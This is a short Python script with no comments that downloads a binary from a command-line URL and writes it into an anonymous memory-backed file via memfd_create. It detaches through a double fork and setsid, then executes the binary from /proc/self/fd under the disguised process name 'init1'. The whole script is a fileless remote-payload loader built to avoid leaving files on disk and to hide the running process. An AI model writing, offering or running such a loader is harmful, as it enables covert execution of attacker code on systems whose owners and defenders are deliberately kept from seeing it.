import ctypes
import os
import sys
import urllib.request
binary=urllib.request.urlopen(url=sys.argv[1]).read()
fd = ctypes.CDLL(None).syscall(319,"",1)
final_fd = open('/proc/self/fd/'+str(fd),'wb')
final_fd.write(binary)
final_fd.close()
fork1 = os.fork()
if 0 != fork1: os._exit(0)
ctypes.CDLL(None).syscall(112)
fork2 = os.fork()
if 0 != fork2: os._exit(0)
os.execl('/proc/self/fd/'+str(fd),'init1',*sys.argv[2:])
